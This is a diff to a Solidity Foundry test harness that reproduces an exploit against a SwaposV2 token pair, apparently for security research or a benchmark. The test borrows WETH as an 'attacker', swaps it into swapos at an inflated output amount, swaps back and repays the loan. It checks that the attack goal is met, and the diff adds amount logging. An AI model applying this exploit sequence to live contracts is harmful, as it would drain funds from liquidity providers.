@@ -267,18 +267,30 @@ contract SwaposV2TestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 3e18);
         borrow_weth_owner(3e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", weth.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(weth.balanceOf(attacker), address(weth)) * 10
+        );
         swap_spair_attacker_weth_swapos(
             weth.balanceOf(attacker),
             pair.getAmountOut(weth.balanceOf(attacker), address(weth)) * 10
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", swapos.balanceOf(attacker));
+        emit log_named_uint(
+            "amt4",
+            pair.getAmountOut(swapos.balanceOf(attacker), address(swapos))
+        );
         swap_pair_attacker_swapos_weth(
             swapos.balanceOf(attacker),
             pair.getAmountOut(swapos.balanceOf(attacker), address(swapos))
         );
         printBalance("After step2 ");
+        emit log_named_uint("amt5", (3e18 * 1003) / 1000);
         payback_weth_owner((3e18 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
@@ -299,7 +311,7 @@ contract SwaposV2TestBase is Test, BlockLoader {
         swap_spair_attacker_weth_swapos(amt1, amt2);
         swap_pair_attacker_swapos_weth(amt3, amt4);
         payback_weth_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
